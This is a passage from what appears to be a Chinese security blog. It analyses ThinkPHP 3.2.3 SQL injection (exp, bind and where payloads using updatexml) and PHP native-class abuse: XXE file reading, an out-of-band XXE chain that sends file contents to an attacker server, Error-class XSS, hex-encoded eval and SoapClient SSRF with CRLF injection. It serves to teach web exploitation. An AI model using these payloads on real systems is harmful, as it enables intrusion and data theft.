class="hljs-keyword">where</span>]=<span class="hljs-number">45789</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><p>if条件不满足</p><p><code>options[&#39;where&#39;]</code>就会是一个字符串，<code>is_array($options[&#39;where&#39;])</code>条件不满足，就成功绕过了</p><p><img src="https://www.hualigs.cn/image/607e9241b5394.jpg"></p><p>注入语句没有被转换，直接被带入执行。</p><p><img src="https://www.hualigs.cn/image/607e92400b9b7.jpg"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>注入产生的原因是构造的poc绕过了thinkphp对<code>$option[&#39;where&#39;]</code>是否是一个数组的判断，从而不满足<code>is_array($options[&#39;where&#39;])</code>，绕过了<code>_parseType</code>函数过滤，从而导致了注入。</p><h1 id="Thinkphp-3-2-3-exp注入"><a href="#Thinkphp-3-2-3-exp注入" class="headerlink" title="Thinkphp 3.2.3 exp注入"></a>Thinkphp 3.2.3 exp注入</h1><p>控制器</p><p><img src="https://www.hualigs.cn/image/607e923fb01b1.jpg"></p><p>payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/tp<span class="hljs-number">3</span>/?username[<span class="hljs-number">0</span>]=exp&amp;username[<span class="hljs-number">1</span>]==<span class="hljs-number">1</span>%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607e924383547.jpg"></p><p><code>find()</code>执行到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$resultSet</span>=<span class="hljs-keyword">$this</span>-&gt;db-&gt;select(<span class="hljs-variable">$options</span>);<br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607e924112362.jpg"></p><p>/ThinkPHP/Library/Think/Db/Driver.class.php</p><p>进入<code>select()</code></p><p><img src="https://www.hualigs.cn/image/607e92405be65.jpg"></p><p>进入<code>buildSelectSql()</code></p><p><img src="https://www.hualigs.cn/image/607e923f74c7f.jpg"></p><p>进入<code>parsesql()</code>，关注<code>parseWhere()</code>函数</p><p><img src="https://www.hualigs.cn/image/607e92424058c.jpg"></p><p><code>parseWhere()</code>函数调用<code>parseWhereItem()</code></p><p>elseif语句中直接拼接了where条件到sql语句中，到达该语句需要满足两个条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$val</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(is_string(<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure><p>由于<code>$exp=strtolower($val[0]);</code>，传入<code>username[0]=exp&amp;username[1]=1 and 1=1</code></p><p><img src="https://www.hualigs.cn/image/607e92426c997.jpg"></p><p>注意控制器那里不能使用<code>I()</code>方法来获取参数，因为前面提到<code>I()</code>方法中调用了<code>think_filter()</code>函数，该函数会过滤exp，导致注入失败</p><p><img src="https://www.hualigs.cn/image/607e923df0bb8.jpg"></p><h1 id="thinkphp-3-2-3-bind注入"><a href="#thinkphp-3-2-3-bind注入" class="headerlink" title="thinkphp 3.2.3 bind注入"></a>thinkphp 3.2.3 bind注入</h1><p>控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;Users&quot;</span>);<br>    <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = I(<span class="hljs-string">&#x27;id&#x27;</span>);<br>    <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = I(<span class="hljs-string">&#x27;password&#x27;</span>);<br>    <span class="hljs-variable">$valu</span> = <span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-variable">$user</span>)-&gt;save(<span class="hljs-variable">$data</span>);<br>    var_dump(<span class="hljs-variable">$valu</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/tp<span class="hljs-number">3</span>/?id[<span class="hljs-number">0</span>]=bind&amp;id[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span> and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)&amp;password=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607e924209d7f.jpg"></p><p>这里需要注意<code>id[1]=0</code>原理在下面说</p><p><code>save()</code>函数中添加断点</p><p><img src="https://www.hualigs.cn/image/607e923fe8d55.jpg"></p><p>/ThinkPHP/Library/Think/Db/Driver.class.php</p><p>进入<code>update()</code></p><p>又经过了<code>parseWhere()</code>函数，除了之前利用的<code>exp</code>还有<code>bind</code>可以利用</p><p><img src="https://www.hualigs.cn/image/607e9240d4c79.jpg"></p><p>直接传递payload，发现添加了冒号，注入失败</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost/tp3/?id</span>[<span class="hljs-string">0</span>]=bind&amp;id[1]=1<br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/607e924147690.jpg"></p><p>可以看到<code>bindParam()</code>添加冒号</p><p><img src="https://www.hualigs.cn/image/607e923f510cf.jpg"></p><p>ThinkPHP/Library/Think/Db/Driver.class.php</p><p><code>execute()</code>将<code>:0</code>替换为传入参数，让参数等于0，相当于<code>:0</code>，然后被替换为1，成功注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;bind))&#123;<br>            <span class="hljs-variable">$that</span>   =   <span class="hljs-keyword">$this</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;queryStr =   strtr(<span class="hljs-keyword">$this</span>-&gt;queryStr,array_map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$val</span></span>) <span class="hljs-title">use</span>(<span class="hljs-params"><span class="hljs-variable">$that</span></span>)</span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span>.<span class="hljs-variable">$that</span>-&gt;escapeString(<span class="hljs-variable">$val</span>).<span class="hljs-string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="hljs-keyword">$this</span>-&gt;bind));<br>        &#125;<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/-qing-/p/11444871.html">https://www.cnblogs.com/-qing-/p/11444871.html</a></p><p><a href="https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/">https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/</a></p><p><a href="https://syst1m.com/post/summary-of-thinkphp3-vulnerability/">https://syst1m.com/post/summary-of-thinkphp3-vulnerability/</a></p><p><a href="https://www.chabug.org/audit/1062.html">https://www.chabug.org/audit/1062.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php原生类利用</title>
    <link href="/2021/04/19/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/"/>
    <url>/2021/04/19/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h1><p>在存在任意类实例化漏洞但是没有pop链的情况下，可以尝试利用原生类</p><h1 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h1><p>可以列出目录下的文件名</p><p>适用版本：php5.3.* php 7</p><p>第一个参数指定搜索的路径和类型，第二个参数为选择文件的哪个信息作为键名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;./*.php&#x27;</span>,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;./*.php&#x27;</span>);<br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$iterator</span>-&gt;valid()) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$iterator</span>-&gt;current()-&gt;getFilename() . <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br>    <span class="hljs-variable">$iterator</span>-&gt;next();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h1><p>SimpleXMLElement::__contruct</p><p>Libxml2.9后默认不允许解析外部实体，可以通过函数参数LIBXML_NOENT开启解析</p><p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c372164.jpg"><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c378864.jpg">利用</p><p>根据可控方式选择</p><h3 id="本地读取"><a href="#本地读取" class="headerlink" title="本地读取"></a>本地读取</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotFound</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;404&#x27;</span>);<br>    &#125;<br>&#125;<br>spl_autoload_register(<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> NotFound();<br>    &#125;<br>);<br><span class="hljs-variable">$classname</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param2</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(class_exists(<span class="hljs-variable">$classname</span>))&#123;<br>    <span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$classname</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$param2</span>);<br>    var_dump(<span class="hljs-variable">$newclass</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$newclass</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&gt;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE ANY [ </span><br><span class="hljs-string">     &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;x&gt;&amp;xxe;&lt;/x&gt;&#x27;</span>;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> SimpleXMLElement(<span class="hljs-variable">$a</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>需要两个参数可控</p><p>利用<code>SimpleXMLElement</code>构造一个XML文档，从而利用 XXE读取文件 。当文件中有&lt; &gt; &amp; ‘ “ 这5个符号时，会导致XML文件解析错误，所以要利用php://filter，将要读取的文件内容经过 base64编码 后输出。如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span>[   </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">name</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot;</span> &gt;</span>]</span><br><span class="hljs-meta">&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-symbol">&amp;name;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>有几个地方需要注意以下，在url中不能直接打<code>&amp;</code> 会被歧义，我们使用 <code>%26</code> 还有就是<code>resource=</code>后面不需要引号包裹。第二个参数里的2对应的模式是 LIBXML_NOENT。<br>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?name=SimpleXMLElement&amp;param=<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span>[<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">name</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot;</span> &gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>%26name;<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&amp;param2=2<br></code></pre></td></tr></table></figure><p>至于为什么第二个参数为二，实际上这里2对应的模式是 LIBXML_NOENT ，我们直接记住用二吧不然就是直接百度。</p><h3 id="远程读取"><a href="#远程读取" class="headerlink" title="远程读取"></a>远程读取</h3><p>必须有三个参数可控，才能读取远程xml文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotFound</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;404&#x27;</span>);<br>    &#125;<br>&#125;<br>spl_autoload_register(<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> NotFound();<br>    &#125;<br>);<br><span class="hljs-variable">$classname</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param2</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param3</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param3&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param3&#x27;</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(class_exists(<span class="hljs-variable">$classname</span>))&#123;<br>    <span class="hljs-comment">//$newclass = new $classname($param,$param2);</span><br>    <span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$classname</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$param2</span>,<span class="hljs-variable">$param3</span>);<br>    var_dump(<span class="hljs-variable">$newclass</span>);<br><span class="hljs-comment">//    foreach ($newclass as $key=&gt;$value)</span><br><span class="hljs-comment">//        echo $key.&#x27;=&gt;&#x27;.$value.&#x27;&lt;br&gt;&#x27;;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>SimpleXMLElement读取远程文件evil.xml-&gt;evil.xml请求send.xml，实际执行的是send.xml</p><p>send.php负责保存结果，在vps上构造如下evil.xml、send.xml和send.php这三个文件。</p><p>evil.xml：</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span>[</span></span><br><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://47.xxx.xxx.72/send.xml&quot;</span>&gt;</span></span><br><span class="perl">%remote;</span><br><span class="perl">%all;</span><br><span class="perl">%send;</span><br><span class="xml">]&gt;</span><br></code></pre></td></tr></table></figure><p>send.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">all</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.111.129/send.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>send.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>file_put_contents(<span class="hljs-string">&quot;result.txt&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后在url中构造如下：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">/show.php?module=SimpleXMLElement&amp;args[]=<span class="hljs-link">http://47.xxx.xxx.72/evil.xml&amp;args</span>[<span class="hljs-string"></span>]=2&amp;args[]=true<br></code></pre></td></tr></table></figure><p>接收到数据</p><p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c2d1bf9.jpg"></p><h1 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error/Exception"></a>Error/Exception</h1><p>__toString</p><h2 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c33a1fc.jpg"></p><h2 id="getmessage"><a href="#getmessage" class="headerlink" title="getmessage"></a>getmessage</h2><p>getMessage可直接传入eval执行命令，将转换成hex执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&#x27;?&#x27;</span>);<br><span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;getMessage&quot;</span>;<br><span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;eval(phpinfo())&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$a-&gt;<span class="hljs-subst">$c</span>(<span class="hljs-subst">$d</span>);&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(hex2bin(<span class="hljs-string">&quot;6563686f20706928293b&quot;</span>))<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> bin2hex(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>();<br><span class="hljs-variable">$a</span>-&gt;getMessage(<span class="hljs-keyword">eval</span>(hex2bin(<span class="hljs-string">&quot;706870696e666f28293b&quot;</span>)));<br><span class="hljs-comment">//</span><br><span class="hljs-comment">//echo bin2hex(&#x27;phpinfo()&#x27;);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>php存在内置类<code>SoapClient::__call</code>，存在可以触发<code>__call</code>方法时，可以进行ssrf</p><p>进行SSRF</p><p>配合CRLF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://192.168.111.129:5555/path&#x27;</span>;<br><span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;data=something&#x27;</span>;<br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: PHPSESSID=my_session&#x27;</span><br>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>.(<span class="hljs-keyword">string</span>)strlen(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>      =&gt; <span class="hljs-string">&quot;aaab&quot;</span>));<br><br><span class="hljs-variable">$aaa</span> = serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$aaa</span>;<br><br><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$c</span>-&gt;not_exists_function();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>成功接收到报文</p><p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c3b4772.jpg"></p><h1 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h1><p>遍历目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 